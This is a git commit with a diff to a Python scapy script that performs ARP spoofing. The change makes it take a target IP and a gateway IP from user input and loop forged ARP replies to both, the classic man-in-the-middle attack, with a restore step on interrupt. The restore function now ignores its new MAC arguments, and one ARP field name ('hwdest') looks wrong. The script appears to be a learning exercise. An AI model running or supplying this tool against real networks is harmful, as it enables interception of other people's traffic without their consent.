a86ad3abb718b187d7f205b5b0837779ace4bebc
gabrielQ12 <gabriel.quinette1@gmail.com>
2023-10-20 02:03:00 +0200

    arp_spoof

--- arp_spoofer/arp_spoof.py
+++ arp_spoofer/arp_spoof.py
@@ -19,18 +19,21 @@ def spoof_arp(target_ip, target_mac, source_ip):
     scapy.send(packet)
     
     
-def restore_arp(target_ip,  source_ip):
+def restore_arp(target_ip,  source_ip, target_mac, source_mac):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdest=get_mac(target_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
     scapy.send(packet)
 
 
 # print(get_mac("machine cible"))
 # print(get_mac("ip du point daccès"))
-
+target_ip_real = input("adresse ip cible:")
+target_mac_real = get_mac(target_ip_real)
+gateway_ip_real = input("adresse ip point d'accès:")
+gateway_mac_real = get_mac(gateway_ip_real)
 try:    
     while True:
-        spoof_arp("ip de la cible", get_mac("machine cible"), "ip du point daccès")
-        spoof_arp("ip du point d'accès", get_mac("machine cible"), "ip de la cible")
+        spoof_arp(target_ip_real, get_mac(target_ip_real), gateway_ip_real)
+        spoof_arp(gateway_ip_real, get_mac(gateway_ip_real), target_ip_real)
 except KeyboardInterrupt:
-    restore_arp("ip cible")
-    restore_arp("ip du point d'accès") 
+    restore_arp(target_ip_real, gateway_ip_real, target_mac_real, gateway_mac_real)
+    restore_arp(gateway_ip_real, target_ip_real, gateway_mac_real, target_mac_real) 
